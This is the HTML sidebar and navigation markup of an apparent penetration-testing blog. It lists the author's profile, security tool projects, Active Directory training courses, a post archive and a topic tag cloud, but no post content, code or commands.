        </div></div>
      
</div>
<div class='blog-pager' id='blog-pager'>
<span id='blog-pager-older-link'>
<a class='blog-pager-older-link' href='https://www.labofapenetrationtester.com/search?updated-max=2018-10-16T23:13:00%2B05:30&max-results=5' id='Blog1_blog-pager-older-link' title='Older Posts'>Older Posts</a>
</span>
<a class='home-link' href='https://www.labofapenetrationtester.com/'>Home</a>
</div>
<div class='clear'></div>
<div class='blog-feeds'>
<div class='feed-links'>
Subscribe to:
<a class='feed-link' href='https://www.labofapenetrationtester.com/feeds/posts/default' target='_blank' type='application/atom+xml'>Posts (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class='column-left-outer'>
<div class='column-left-inner'>
<aside>
</aside>
</div>
</div>
<div class='column-right-outer'>
<div class='column-right-inner'>
<aside>
<div class='sidebar section' id='sidebar-right-1'><div class='widget Profile' data-version='1' id='Profile1'>
<h2>About Me</h2>
<div class='widget-content'>
<a href='https://www.blogger.com/profile/02092541175521734123'><img alt='My photo' class='profile-img' height='80' src='//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhCkL44fje5Y0lLzjpO9CUoJBSC5ZdgrP9wzJx4w_DtQ_kuoaqdWCqrGimqebLevlcU8pNkp35Xc6z-Y_tR-o_NCVvbaeQdBMoy5jV2IScU8nEhEH8tJ86kEDocL3J62g/s113/Nikhil_Mittal_.JPG' width='80'/></a>
<dl class='profile-datablock'>
<dt class='profile-data'>
<a class='profile-name-link g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' style='background-image: url(//www.blogger.com/img/logo-16.png);'>
Nikhil SamratAshok Mittal
</a>
</dt>
<dd class='profile-textblock'>I am a hacker, information security researcher and enthusiast. On this blog, I write about my projects, experiments and presentations. </dd>
</dl>
<a class='profile-link' href='https://www.blogger.com/profile/02092541175521734123' rel='author'>View my complete profile</a>
<div class='clear'></div>
</div>
</div><div class='widget LinkList' data-version='1' id='LinkList1'>
<h2>My Projects</h2>
<div class='widget-content'>
<ul>
<li><a href='https://github.com/samratashok/nishang'>Nishang - Using PowerShell for Penetration Testing</a></li>
<li><a href='https://github.com/samratashok/RACE'>RACE - Execute ACL attacks and backdoors</a></li>
<li><a href='https://github.com/samratashok/Deploy-Deception'>Deploy-Deception - Deploy active directory decoy objects</a></li>
<li><a href='https://github.com/samratashok/Kautilya'>Kautilya - Pwnage with Human Interface Devices</a></li>
</ul>
<div class='clear'></div>
</div>
</div><div class='widget Text' data-version='1' id='Text1'>
<h2 class='title'>My upcoming Trainings/Talks</h2>
<div class='widget-content'>
<a href="https://www.brucon.org/2020/brucon-2020-training/active-directory-attacks-for-red-and-blue-teams-advanced-edition/">April 22-24, Active Directory Attacks for Red and Blue Teams - Advanced Edition - Three days training at BruCON Spring, Belgium</a>
</div>
<div class='clear'></div>
</div><div class='widget Text' data-version='1' id='Text3'>
<h2 class='title'>Online Labs and Courses</h2>
<div class='widget-content'>
<div><a href="https://www.pentesteracademy.com/redteamlab">RedTeam Lab - Challenge Lab (with 4 hours of video course) for Windows and Active Directory Red Team Operations</a></div><div><br /></div><div><a href="https://www.pentesteracademy.com/activedirectorylab">ActiveDirectory Lab - Practice Lab (with 14 hours of video course) for Windows and Active Directory Red Team operations</a><br /></div>
</div>
<div class='clear'></div>
</div><div class='widget Text' data-version='1' id='Text2'>
<h2 class='title'>Video Courses</h2>
<div class='widget-content'>
<a href="https://www.pentesteracademy.com/course?id=21">PowerShell for Penetration Testers</a><br /><a href="http://promo.securitytube-training.com/wmi"><br /></a><a href="https://www.pentesteracademy.com/course?id=34">WMI Attacks and Defense at PentesterAcademy</a><br /><a href="http://promo.securitytube-training.com/mssql"><br /></a><div><a href="https://www.pentesteracademy.com/course?id=35">Abusing SQL Server Trusts</a></div><div><br /></div><div><a href="https://www.pentesteracademy.com/course?id=47">Attacking and Defending Active Directory</a><br /></div>
</div>
<div class='clear'></div>
</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
<h2>Blog Archive</h2>
<div class='widget-content'>
<div id='ArchiveList'>
<div id='BlogArchive1_ArchiveList'>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2019/'>
2019
</a>
<span class='post-count' dir='ltr'>(2)</span>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2019/08/'>
August
</a>
<span class='post-count' dir='ltr'>(1)</span>
<ul class='posts'>
<li><a href='https://www.labofapenetrationtester.com/2019/08/race.html'>RACE - Minimal Rights and ACE for Active Directory...</a></li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2019/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/'>
2018
</a>
<span class='post-count' dir='ltr'>(5)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/10/'>
October
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2018/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/'>
2017
</a>
<span class='post-count' dir='ltr'>(7)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/08/'>
August
</a>
<span class='post-count' dir='ltr'>(5)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2017/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/'>
2016
</a>
<span class='post-count' dir='ltr'>(5)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/09/'>
September
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2016/02/'>
February
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/'>
2015
</a>
<span class='post-count' dir='ltr'>(19)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/12/'>
December
</a>
<span class='post-count' dir='ltr'>(4)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/09/'>
September
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/08/'>
August
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/05/'>
May
</a>
<span class='post-count' dir='ltr'>(6)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/02/'>
February
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2015/01/'>
January
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/'>
2014
</a>
<span class='post-count' dir='ltr'>(11)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/08/'>
August
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/06/'>
June
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2014/04/'>
April
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/'>
2013
</a>
<span class='post-count' dir='ltr'>(8)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/09/'>
September
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/08/'>
August
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/05/'>
May
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/02/'>
February
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2013/01/'>
January
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/'>
2012
</a>
<span class='post-count' dir='ltr'>(14)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/09/'>
September
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/08/'>
August
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/05/'>
May
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/04/'>
April
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2012/02/'>
February
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2011/'>
2011
</a>
<span class='post-count' dir='ltr'>(1)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.labofapenetrationtester.com/2011/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
</div>
</div>
<div class='clear'></div>
</div>
</div><div class='widget Label' data-version='1' id='Label1'>
<h2>Tag Cloud</h2>
<div class='widget-content cloud-label-widget-content'>
<span class='label-size label-size-5'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Powershell'>Powershell</a>
</span>
<span class='label-size label-size-5'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Penetration%20Testing'>Penetration Testing</a>
</span>
<span class='label-size label-size-5'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Pen%20Test'>PowerShell for Pen Test</a>
</span>
<span class='label-size label-size-5'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Nishang'>Nishang</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20Core'>PowerShell Core</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Kautilya'>Kautilya</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Red%20Team'>Red Team</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Active%20Directory'>Active Directory</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Human%20Interface%20Device'>Human Interface Device</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/USB%20HID'>USB HID</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams'>Active Directory Attacks for Red and Blue Teams</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell'>Offensive PowerShell</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Security'>Security</a>
</span>
<span class='label-size label-size-4'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Teensy'>Teensy</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams'>Offensive PowerShell for Red and Blue Teams</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Kerberos'>Kerberos</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Mimikatz'>Mimikatz</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/ATA'>ATA</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Advanced%20Threat%20Analytics'>Advanced Threat Analytics</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Powerpreter'>Powerpreter</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/BlackHat'>BlackHat</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Continuous%20Integration'>Continuous Integration</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Continuous%20Intrusion'>Continuous Intrusion</a>
</span>
<span class='label-size label-size-3'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Red%20Team'>PowerShell for Red Team</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Jenkins'>Jenkins</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/AMSI'>AMSI</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Deception'>Active Directory Deception</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Antak'>Antak</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Applocker'>Applocker</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Client%20Side%20Attacks'>Client Side Attacks</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/DCShadow'>DCShadow</a>
</span>
<span class='label-size label-size-2'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Gupt'>Gupt</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Advanced%20Windows%20Tradecraft'>Advanced Windows Tradecraft</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Bypass%20UAC'>Bypass UAC</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Cobalt%20Strike'>Cobalt Strike</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Cross%20Forest'>Cross Forest</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/CruiseControl'>CruiseControl</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Deception'>Deception</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Deploy-Deception'>Deploy-Deception</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/End%20Point%20Protector%204'>End Point Protector 4</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Go'>Go</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/IQY'>IQY</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/MJPEG'>MJPEG</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Mac%20OS%20X'>Mac OS X</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PAM'>PAM</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/POODLE'>POODLE</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PWSA'>PWSA</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Phishing'>Phishing</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShell%20Web%20Access'>PowerShell Web Access</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerShellv6'>PowerShellv6</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/PowerUpSQL'>PowerUpSQL</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Prasadhak'>Prasadhak</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/RACE'>RACE</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/SQL%20Server'>SQL Server</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Shadow%20Security%20Principals'>Shadow Security Principals</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/TeamCity'>TeamCity</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/VM'>VM</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Virtual%20Machine'>Virtual Machine</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/WMI'>WMI</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/Windows%20Tradecraft'>Windows Tradecraft</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/pass%20the%20hash'>pass the hash</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/pass%20the%20hash%20with%20powershell'>pass the hash with powershell</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/regsvr32'>regsvr32</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/rundll32'>rundll32</a>
</span>
<span class='label-size label-size-1'>
<a dir='ltr' href='https://www.labofapenetrationtester.com/search/label/virustotal%20api'>virustotal api</a>
</span>
<div class='clear'></div>
</div>
</div><div class='widget HTML' data-version='1' id='HTML2'>
